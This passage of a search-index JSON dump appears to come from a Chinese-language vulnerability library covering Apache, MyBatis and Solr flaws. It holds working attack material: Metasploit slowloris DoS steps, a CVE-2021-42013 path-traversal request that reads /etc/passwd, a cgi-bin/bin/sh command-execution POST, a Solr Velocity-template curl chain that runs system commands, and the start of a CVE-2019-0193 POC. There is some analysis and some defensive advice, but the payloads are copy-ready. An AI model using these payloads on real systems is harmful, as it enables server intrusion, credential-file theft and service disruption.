https://tomcat.apache.org/download-90.cgi</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/","title":"Apache\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Apache 1.x/2.x</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>nmap\u4f7f\u7528-sV\u626b\u63cf\u670d\u52a1\u5668\u83b7\u53d6\u670d\u52a1\u7248\u672c msf\u5229\u7528\u6b65\u9aa4\u5982\u4e0b``` 1.msfconsole(\u542f\u52a8metasploit)</p> <p>2.use auxiliary/dos/http/slowloris(\u4f7f\u7528\u6a21\u5757)</p> <p>3.set RHOST targetip(\u8bbe\u7f6e\u76ee\u6807IP)</p> <p>4.run(\u6267\u884c\u653b\u51fb) </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"CVE 2020 26945 mybatis\u4e8c\u7ea7\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#cve-2020-26945-mybatis","title":"CVE-2020-26945 mybatis\u4e8c\u7ea7\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x01","title":"0x01 \u7b80\u4ecb","text":"<p>MyBatis \u672c\u662fApache\u7684\u4e00\u4e2a\u5f00\u6e90\u9879\u76eeiBatis, 2010\u5e74\u8fd9\u4e2a\u9879\u76ee\u7531Apache Software Foundation  \u8fc1\u79fb\u5230\u4e86Google  Code\uff0c\u5e76\u4e14\u6539\u540d\u4e3aMyBatis\u3002MyBatis\u662f\u4e00\u6b3e\u4f18\u79c0\u7684\u6301\u4e45\u5c42\u6846\u67b6\uff0c\u5b83\u652f\u6301\u5b9a\u5236\u5316SQL\u3001\u5b58\u50a8\u8fc7\u7a0b\u4ee5\u53ca\u9ad8\u7ea7\u6620\u5c04\u3002MyBatis\u907f\u514d\u4e86\u51e0\u4e4e\u6240\u6709\u7684JDBC\u4ee3\u7801\u548c\u624b\u52a8\u8bbe\u7f6e\u53c2\u6570\u4ee5\u53ca\u83b7\u53d6\u7ed3\u679c\u96c6\u3002MyBatis\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u7684XML\u6216\u6ce8\u89e3\u6765\u914d\u7f6e\u548c\u6620\u5c04\u539f\u751f\u4fe1\u606f\uff0c\u5c06\u63a5\u53e3\u548c Java \u7684 POJOs(Plain Ordinary Java Object,\u666e\u901a\u7684 Java\u5bf9\u8c61)\u6620\u5c04\u6210\u6570\u636e\u5e93\u4e2d\u7684\u8bb0\u5f55\u3002</p> <p>\u6f0f\u6d1e\u63cf\u8ff02020\u5e7410\u67086\u65e5\uff0cMyBatis\u5b98\u65b9\u53d1\u5e03\u4e86MyBatis 3.5.6\u7248\u672c\uff0c\u4fee\u590d\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2020-26945\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_1","title":"\u5229\u7528\u6761\u4ef6","text":"<ol> <li>\u7528\u6237\u542f\u7528\u4e86\u4e8c\u7ea7\u7f13\u5b58\u529f\u80fd</li> <li>\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u7f13\u5b58\u7684\u5185\u5bb9\uff0c\u66ff\u6362\u4e3a\u6076\u610f\u53cd\u5e8f\u5217\u5316\u6570\u636e</li> <li>\u7528\u6237\u672a\u8bbe\u7f6eJEP-290\u8fc7\u6ee4\uff0c\u4e14\u6ca1\u6709\u4efb\u4f55\u9632\u5fa1\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u63aa\u65bd</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02","title":"0x02 \u5206\u6790","text":"<p>\u4e8c\u7ea7\u7f13\u5b58\u5176\u5b9e\u5c31\u662f\u5c06\u67e5\u8be2\u7684\u7ed3\u679c\uff0c\u653e\u5165\u7f13\u5b58\u4e2d\uff0c\u4e0b\u6b21\u67e5\u8be2\u76f8\u540c\u7684\u6761\u4ef6\u65f6\uff0c\u76f4\u63a5\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\u7ed3\u679c\uff0c\u964d\u4f4esql\u670d\u52a1\u5668\u7684\u538b\u529b\u3002\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u4e8c\u7ea7\u7f13\u5b58\u53ef\u4ee5\u7f13\u5b58\u5728redis\u7b49kv\u6570\u636e\u5e93\uff0c\u4e5f\u53ef\u4ee5\u6211\u4eec\u81ea\u5df1\u5b9e\u73b0\u76f8\u5173\u7f13\u5b58\u3002</p> <p>\u5982\u679c\u6211\u4eec\u9700\u8981\u81ea\u5b9a\u4e49\u7f13\u5b58\uff0c\u53ea\u9700\u8981\u96c6\u6210\u5982\u4e0b\u63a5\u53e3\u5373\u53ef</p> <pre><code>public interface Cache {\nString getId();\nint getSize();\nvoid putObject(Object key, Object value);\nObject getObject(Object key);\nboolean hasKey(Object key);\nObject removeObject(Object key);\nvoid clear();\n}\n</code></pre> <p>\u4e8c\u7ea7\u7f13\u5b58\u9ed8\u8ba4\u662f\u4e0d\u5f00\u542f\u7684\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\uff0c\u5b9e\u73b0\u4e8c\u7ea7\u7f13\u5b58\u7684\u65f6\u5019\uff0cMyBatis\u8981\u6c42\u8fd4\u56de\u7684POJO\u5fc5\u987b\u662f\u53ef\u5e8f\u5217\u5316\u7684\u3002\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\u7684\u6761\u4ef6\u4e5f\u662f\u6bd4\u8f83\u7b80\u5355\uff0c\u901a\u8fc7\u76f4\u63a5\u5728 MyBatis \u914d\u7f6e\u6587\u4ef6\u4e2d\u901a\u8fc7</p> <pre><code>&lt;settings&gt;\n        &lt;setting name = \"cacheEnabled\" value = \"true\" /&gt;&lt;/settings&gt;\n</code></pre> <p>\u6765\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\uff0c\u8fd8\u9700\u8981\u5728 Mapper \u7684xml \u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165 <code>&lt;cache&gt;</code> \u6807\u7b7e</p> <p>\u4e8c\u7ea7\u7f13\u5b58\u4e2d\uff0c\u88ab\u7f13\u5b58\u7684\u5bf9\u8c61\u5fc5\u987b\u662f\u7ee7\u627f\u81ea  <code>Serializable</code>\u63a5\u53e3\uff0c\u7f13\u5b58\u7684\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u5c06POJO\u53cd\u5e8f\u5217\u5316\u540e\uff0c\u5b58\u5165\u7f13\u5b58\u4e2d\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x03","title":"0x03 \u590d\u73b0","text":"<p>\u5728\u7f51\u4e0a\u968f\u4fbf\u4e0b\u8f7d\u4e00\u4e2aspring boot \u4e8c\u7ea7\u7f13\u5b58\u7684\u5b66\u4e60\u9879\u76ee\uff0c\u672c\u5730\u642d\u5efa\u5c31\u884c\u3002\u6211\u7528  https://github.com/Lovelcp/spring-boot-mybatis-with-redis \u642d\u5efa</p> <p>\u4fee\u6539 ProductMapper.xml \u914d\u7f6e\u6587\u4ef6\u5982\u4e0b</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;\n&lt;!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt;\n&lt;mapper namespace=\"com.wooyoo.learning.dao.mapper.ProductMapper\"&gt;\n\n    &lt;cache type=\"org.apache.ibatis.cache.impl.PerpetualCache\"/&gt;\n\n    &lt;select id=\"select\" resultType=\"Product\"&gt;\n        SELECT * FROM products WHERE id = #{id} LIMIT 1\n    &lt;/select&gt;\n\n    &lt;update id=\"update\" parameterType=\"Product\" flushCache=\"true\"&gt;\n        UPDATE products SET name = #{name}, price = #{price} WHERE id = #{id} LIMIT 1\n    &lt;/update&gt;\n&lt;/mapper&gt;\n</code></pre> <p>\u7136\u540e\u5728<code>org.apache.ibatis.cache.impl.PerpetualCache</code> \u76f8\u5173\u4f4d\u7f6e\u6253\u4e0a\u65ad\u70b9  </p> <p>\u8bbe\u7f6e\u597dmysql\u6570\u636e\u5e93\uff0c\u5efa\u5e93\u5efa\u8868\uff0c\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 \u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>application.yml</p> <pre><code>spring:\n  # \u6570\u636e\u5e93\u914d\u7f6e\n  datasource:\n    url: jdbc:mysql://192.168.3.254/test?autoReconnect=true&amp;useSSL=false\n    username: root\n    password: 123456\n    driver-class-name: com.mysql.jdbc.Driver\n</code></pre> <p>\u6d4f\u89c8\u5668\u8bbf\u95ee  http://127.0.0.1:9999/product/1  \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u4e8c\u7ea7\u7f13\u5b58\u751f\u6548\u4e86\uff0c\u5c06\u7ed3\u679c\u5df2\u7ecf\u5b58\u50a8\u5230\u6211\u4eec\u9884\u5148\u8bbe\u5b9a\u7684\u7f13\u5b58\u4e2d\uff0c\u622a\u56fe\u5982\u4e0b  </p> <p></p> <p>\u5f53\u7136\uff0ckey\u4e0evalue\u5e76\u6ca1\u6709\u88ab\u5e8f\u5217\u5316\uff0c\u56e0\u4e3a\u7cfb\u7edf\u9ed8\u8ba4\u7684\u8fd9\u4e2a\u7f13\u5b58\uff0c\u5e76\u4e0d\u4f1a\u5e8f\u5217\u5316\u53cd\u5e8f\u5217\u5316\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u770b\u4e00\u4e0bmybatis \u5b98\u65b9redis <code>mybatis/redis-cache</code>\u7f13\u5b58\u63d2\u4ef6\uff0c\u76f8\u5173\u64cd\u4f5c</p> <pre><code>  @Override\n  public void putObject(final Object key, final Object value) {\n    execute(new RedisCallback() {\n      @Override\n      public Object doWithRedis(Jedis jedis) {\n        final byte[] idBytes = id.getBytes();\n        jedis.hset(idBytes, key.toString().getBytes(), redisConfig.getSerializer().serialize(value));\n        if (timeout != null &amp;&amp; jedis.ttl(idBytes) == -1) {\n          jedis.expire(idBytes, timeout);\n        }\n        return null;\n      }\n    });\n  }\n\n  @Override\n  public Object getObject(final Object key) {\n    return execute(new RedisCallback() {\n      @Override\n      public Object doWithRedis(Jedis jedis) {\n        return redisConfig.getSerializer().unserialize(jedis.hget(id.getBytes(), key.toString().getBytes()));\n      }\n    });\n  }\n</code></pre> <p>\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u770b\u51fa\uff0c\u5c06\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u540e\u5b58\u50a8\u81f3redis\u670d\u52a1\u5668\u4e2d\u3002  </p> <p>\u66ff\u6362\u91cc\u9762\u7684\u6570\u636e\u4e3a\u6211\u4eec\u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u5185\u5bb9\u5373\u53ef\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04","title":"0x04 \u9632\u5fa1\u63aa\u65bd","text":"<ol> <li>\u542f\u7528\u7684\u4e8c\u7ea7\u7f13\u5b58\u6ca1\u6709\u95ee\u9898\uff0c\u95ee\u9898\u5728\u4e8e\uff0c\u7f13\u5b58\u670d\u52a1\u5668**\u662f\u5426\u5141\u8bb8\u4efb\u610f\u7528\u6237\u8bbf\u95ee**\uff1f\uff1f</li> <li>\u5982\u679c\u786e\u8ba4\u81ea\u5df1\u7684\u4e1a\u52a1\u6ca1\u6709\u4e8c\u7ea7\u7f13\u5b58\u6216\u8005\u4e8c\u7ea7\u7f13\u5b58\u670d\u52a1\u5668\u5bf9\u5916\u4e0d\u53ef\u89c1\uff0c\u53ef\u4ee5\u6682\u65f6\u4e0d\u7528\u5904\u7406\u8be5\u6f0f\u6d1e</li> <li>\u5982\u679c\u4e8c\u7ea7\u7f13\u5b58\u670d\u52a1\u5668\u5bf9\u5916\uff0c\u91cd\u70b9\u68c0\u67e5\u7b2c\u4e09\u65b9\u7f13\u5b58\u662f\u5426\u4f7f\u7528java\u53cd\u5e8f\u5217\u5316</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_2","title":"\u5410\u69fd","text":"<p>\u67d0\u5b9e\u9a8c\u5ba4\uff0c\u4f60\u81ea\u5df1\u770b\u770b\u4f60\u7ffb\u8bd1\u7684\u90a3\u73a9\u610f\uff0c\u770b\u5b8c\u4e00\u8138\u61f5\u903c</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_3","title":"\u53c2\u8003","text":"<ol> <li>https://github.com/mybatis/mybatis-3/pull/2079</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/","title":"CVE 2021 42013 apache\u8def\u5f84\u904d\u5386","text":"<p>\u672c\u6b21\u6f0f\u6d1e\u7f16\u53f7\u4e3a\uff1a<code>CVE-2021-42013</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Apache HTTP Server\u662f\u7f8e\u56fd\u963f\u5e15\u5947\uff08Apache\uff09\u57fa\u91d1\u4f1a\u7684\u4e00\u6b3e\u5f00\u6e90\u7f51\u9875\u670d\u52a1\u5668\u3002\u8be5\u670d\u52a1\u5668\u5177\u6709\u5feb\u901f\u3001\u53ef\u9760\u4e14\u53ef\u901a\u8fc7\u7b80\u5355\u7684API\u8fdb\u884c\u6269\u5145\u7684\u7279\u70b9\u3002</p> <p>Apache HTTP Server \u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u53d1\u73b0 Apache HTTP Server 2.4.50 \u7248\u672c\u4e2d\u5bf9 CVE-2021-41773 \u7684\u4fee\u590d\u4e0d\u591f\u5145\u5206\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8def\u5f84\u904d\u5386\u653b\u51fb\u5c06 URL \u6620\u5c04\u5230\u7531\u7c7b\u4f3c\u522b\u540d\u7684\u6307\u4ee4\u914d\u7f6e\u7684\u76ee\u5f55\u4e4b\u5916\u7684\u6587\u4ef6\u3002\u5982\u679c\u8fd9\u4e9b\u76ee\u5f55\u4e4b\u5916\u7684\u6587\u4ef6\u4e0d\u53d7\u901a\u5e38\u7684\u9ed8\u8ba4\u914d\u7f6e\u201c\u8981\u6c42\u5168\u90e8\u62d2\u7edd\u201d\u7684\u4fdd\u62a4\uff0c\u5219\u8fd9\u4e9b\u8bf7\u6c42\u53ef\u80fd\u4f1a\u6210\u529f\u3002\u5982\u679c\u8fd8\u4e3a\u8fd9\u4e9b\u522b\u540d\u8def\u5f84\u542f\u7528\u4e86 CGI \u811a\u672c\uff0c\u5219\u53ef\u4ee5\u5141\u8bb8\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/#_2","title":"\u6f0f\u6d1e\u516c\u5e03","text":"<p>\u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5\uff1a</p> <p>https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-httpd-pathtrv-LAzg68cZ</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/#_3","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Apache HTTPd 2.4.49/2.4.50\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/#_4","title":"\u73af\u5883\u642d\u5efa\u8fc7\u7a0b","text":"<p>\u7528docker\u4e00\u952e\u642d\u5efa <pre><code>sudo docker pull blueteamsteve/cve-2021-41773:no-cgid\n\nsudo docker run -dit -p 8080:80 blueteamsteve/cve-2021-41773:no-cgid\n</code></pre></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/#_5","title":"\u6f0f\u6d1e\u9a8c\u8bc1\u8fc7\u7a0b","text":"<p>\u76ee\u5f55\u904d\u5386payload\uff0c\u8bfb\u53d6passwd\u6587\u4ef6 <pre><code>GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1\nHost: 192.168.123.130:8080\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en;q=0.7\nCookie: seraph.confluence=524289%3A0c7b1f76339049133e306426161621fb136996fc\nIf-None-Match: \"2d-432a5e4a73a80\"\nIf-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT\nConnection: close\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/#_6","title":"\u590d\u73b0\u7ed3\u679c","text":"<p>\u5176\u5b9e\u6839\u636e\u8fd9\u4e2a\u6f0f\u6d1e\u8fd8\u80fdRCE\u7684\uff0c\u4f46\u662f\u56e0\u4e3a\u6211\u73af\u5883\u6709\u70b9\u95ee\u9898\u65e0\u6cd5\u590d\u73b0\uff0c\u7531\u4e8e\u590d\u73b0\u96be\u5ea6\u4e0d\u9ad8\uff0c\u6240\u4ee5\u5c31\u8d34\u56fe\u4e86\uff0c\u7ed9\u4e2apayload\u5c31\u597d\u4e86 <pre><code>POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1\nHost: host\nConnection: close\nContent-Length: 13\n\necho;ifconfig\n</code></pre></p> <p>\u7531\u6b64\u53ef\u89c1\uff0c\u8be5\u6f0f\u6d1e\u7ee7\u4e0a\u6b21\u7684<code>CVE-2021-41773</code>\u6f0f\u6d1e\u4fee\u590d\u5e76\u4e0d\u5b8c\u5584\uff0c\u6240\u4ee5\u624d\u5bfc\u81f4\u4e86\u672c\u6b21\u6f0f\u6d1e\u7684\u53d1\u751f\uff01</p> <p>\u4e00\u4e2a\u56fe\u7247\u603b\u7ed3\u8fd9\u6b21ApacheHTTPd 2.4.50\u7248\u672c\u4fee\u590d\u4e0d\u5b8c\u5584\u3002 \uff08\u56fe\u7247\u662f\u76d7inbug\u7684\u54c8\u54c8\u54c8\u54c8\uff0c\u5b8c\u7f8e\u7684\u8be0\u91ca\u4e86\u672c\u6b21\u6f0f\u6d1e\u7684\u4fee\u590d\u54c8\u54c8\u54c8\u54c8\uff09 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2021-42013_apache%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/#inbug","title":"\u6b64\u5916\uff0cInbug\u5b9e\u9a8c\u5ba4\u8fd8\u63d0\u4f9b\u4e86\u6279\u91cf\u591a\u7ebf\u7a0b\u68c0\u6d4b","text":"<p>Apache 2.4.49 (CVE-2021-41773) Apache 2.4.50 (CVE-2021-42013) Github\u5730\u5740\uff1a https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013 </p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"Apache Solr\u672a\u6388\u6743\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>\u9700\u8981solr\u4ee5cloud\u6a21\u5f0f\u542f\u52a8\uff0c\u7279\u5f81\u662f\uff1a </p> <p>\u4f1a\u6709\u4e00\u4e2acloud\u7684\u529f\u80fd \u3002</p> <p>\u7f16\u8bd1\u4e00\u4e2a\u6076\u610f\u914d\u7f6e\uff1a</p> <p></p> <p>\u5728\u5bf9\u5e94\u76ee\u5f55\u4e0b\u4f9d\u6b21\u6267\u884c\u4ee5\u4e0bshell\u547d\u4ee4\u3002</p> <p>/solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf</p> <p>zip -r - * &gt; mytest.zip</p> <p>curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @mytest.zip \"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=mytest\"  #\u6ce8\u518c\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u96c6\u5408\u4e3amytest</p> <p>curl \"http://127.0.0.1:8983/api/cluster/configs?omitHeader=true\"  #\u67e5\u8be2\u914d\u7f6e\u6587\u4ef6\u96c6\u5408\u662f\u5426\u4e0a\u4f20\u6210\u529f</p> <p>curl \"http://127.0.0.1:8983/solr/admin/configs?action=CREATE&amp;name=mytest2&amp;baseConfigSet=mytest&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true\"</p> <p>curl \"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=mytest&amp;numShards=1&amp;replicationFactor=1&amp;wt=xml&amp;collection.configName=mytest2\" #\u4f7f\u7528\u4e4b\u524d\u4e0a\u4f20\u7684\u914d\u7f6e\u6587\u4ef6\u96c6\u5408\u4e3amytest</p> <p></p> <p>curl -v \"http://127.0.0.1:8983/solr/mytest/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set(\\(x='')+%23set(\\)rt=\\(x.class.forName('java.lang.Runtime'))+%23set(\\)chr=\\(x.class.forName(%27java.lang.Character%27))+%23set(\\)str=\\(x.class.forName(%27java.lang.String%27))+%23set(\\)ex=\\(rt.getRuntime().exec(%27id%27))+\\)ex.waitFor()+%23set(\\(out=\\)ex.getInputStream())+%23foreach(\\(i+in+[1..\\)out.available()])\\(str.valueOf(\\)chr.toChars($out.read()))%23end\"</p> <p>\u6700\u540e\u6267\u884c\u547d\u4ee4\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2019-0193/","title":"Apache Solr\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2019-0193","text":"<p>\u5f71\u54cd\u7248\u672c apache solr 5.x-8.2.0,\u5b58\u5728config API\u7248\u672c \u83b7\u53d6\u6240\u6709 core \u4fe1\u606f\uff1acurl http://IP/solr/admin/cores HTTP\u534f\u8bae\u5934\uff1aPOST /solr//dataimport</p> <p>POC</p> <pre><code>POST /solr/&lt;your_core_name&gt;/dataimport HTTP/1.1\nHost: 127.0.0.1:8983\nContent-Length: 763\nUser-Agent: Mozilla/5.0\nContent-type: application/x-www-form-urlencoded\nConnection: 